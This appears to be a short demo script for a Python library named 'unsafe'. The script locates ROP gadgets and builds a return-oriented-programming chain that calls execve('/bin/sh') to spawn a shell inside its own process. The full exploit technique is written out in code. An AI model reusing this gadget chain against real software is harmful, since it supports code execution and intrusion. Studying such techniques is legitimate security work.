import unsafe

gadgets = unsafe.find_gadgets()

binsh = unsafe.refbytes(b"/bin/sh\0")
argv = unsafe.refbytes(bytes(bytearray(unsafe.p64a(binsh, 0))))

rop_payload = unsafe.p64a(
	gadgets["pop rax; ret"],
	59,  # SYS_EXECVE
	
	gadgets["pop rdi; ret"],
	binsh,  # filename
	
	gadgets["pop rsi; ret"],
	argv,  # argv
	
	gadgets["pop rdx; pop rbx; ret"],
	0,  # envp
	0,  #junk
	
	gadgets["syscall; ret"]
)

unsafe.do_rop(rop_payload)
